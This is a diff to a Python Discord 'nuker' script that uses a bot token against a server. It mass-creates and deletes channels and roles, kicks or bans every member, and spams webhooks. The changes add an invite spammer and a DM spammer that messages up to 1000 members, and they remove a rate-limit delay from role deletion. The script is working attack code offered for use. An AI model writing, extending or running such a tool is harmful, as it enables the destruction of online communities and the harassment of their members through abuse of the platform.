@@ -11,9 +11,12 @@ except:
     import requests
     from pystyle import Colorate,Colors
 banner="""
+
 zufinho nuker v2
+
+discord.gg/jvrBvcCm72
 """
-version="beta 2.1 termux - v2"
+version="beta 2.2 linux - v2"
 def printcolor(text):
     print(Colorate.Horizontal(Colors.purple_to_blue,text,1))
 #varivbles importants
@@ -80,6 +83,7 @@ while True:
     printcolor("[1] Create Channels         [2] Delete Channels         [3] Create Roles        [4] Delete Roles")
     printcolor("[5] Rename Channels         [6] Rename Roles            [7] Rename User         [8] Rename Emojis")
     printcolor("[9] Kick all                [10] Ban all                [11] Unban all          [12] Webhook Spammer")
+    printcolor("[13] Invite Spammer         [14] Dm Spammer")
     print()
     cmd=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
     if cmd=="1":
@@ -106,7 +110,7 @@ while True:
             printcolor("Amount of channels:")
             repeat=int(input(Colorate.Horizontal(Colors.purple_to_blue,">",1)))
             while not count==repeat:
-                print(f"requested to create {new}")
+                printcolor(f"requested to create {new}")
                 requests.post(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}","Content-Type": "application/json",}, json={"name": new, "type": new1})
                 count+=1
             printcolor("Finished")
@@ -141,7 +145,6 @@ while True:
             for role in api.json():
                 printcolor(f"requested to delete {role['name']}")
                 requests.delete(f"https://discord.com/api/v9/guilds/{guildid}/roles/{role['id']}", headers={"Authorization": f"Bot {token}",})
-                time.sleep(0.55)
         else:
             print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
         printcolor("Finished")
@@ -242,8 +245,51 @@ while True:
             for channel in api.json():
                 printcolor(f"Requested to create webhook at {channel['name']}")
                 new1 = requests.post(f"https://discord.com/api/v9/channels/{channel['id']}/webhooks",headers={"Authorization": f"Bot {token}"},json={"name": "zufinho nuker v2","avatar": None})
-                printcolor(f"Requested to create webhook at {channel['name']}")
+                printcolor(f"Requested to send webhook at {channel['name']}")
                 requests.post(new1.json().get('url'),json={"content": new})
         else:
             print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
+        time.sleep(1)
+    elif cmd == "13":
+        #invite spammer
+        printcolor("Repeat how many times per channel?")
+        new=int(input(">"))
+        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"})
+        for channel in api.json():
+            count=0
+            while not count==new:
+                printcolor(f"[{count}] requested to create invite at {channel['name']}")
+                requests.post(f"https://discord.com/api/v9/channels/{channel['id']}/invites", json={'max_age': 0,'max_uses': 0}, headers={'Authorization': f'Bot {token}'})
+                count +=1
+        printcolor("Finished!")
+        time.sleep(1)
+    elif cmd=="14":
+        #dm spammer
+        printcolor("Message:")
+        new = input(Colorate.Horizontal(Colors.purple_to_blue, ">", 1))
+        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers={"Authorization": f"Bot {token}"})
+        if api.status_code == 200:
+            for pessoa in api.json():
+                printcolor(f"start request to start dm with {pessoa['user']['username']}")
+                new1 = requests.post('https://discord.com/api/v9/users/@me/channels',
+                                    headers={'Authorization': f'Bot {token}', 'Content-Type': 'application/json'},
+                                    json={'recipient_id': pessoa['user']['id']})
+
+                if new1.status_code == 200:
+                    new1_data = new1.json()
+                    if 'id' in new1_data:
+                        id_canal = new1_data['id']
+                        printcolor(f"request to send message to {pessoa['user']['username']}")
+                        resposta = requests.post(f'https://discord.com/api/v9/channels/{id_canal}/messages',
+                                                headers={'Authorization': f'Bot {token}', 'Content-Type': 'application/json'},
+                                                json={'content': new})
+                        if resposta.status_code != 200:
+                            printcolor(f"fail to send dm: {resposta.status_code}")
+                    else:
+                        printcolor("fail to create dm")
+                else:
+                    printcolor(f"faild to create dm: {new1.status_code}")
+        else:
+            printcolor(f"fail to get members: {api.status_code}")
+        printcolor("Finished")
         time.sleep(1)
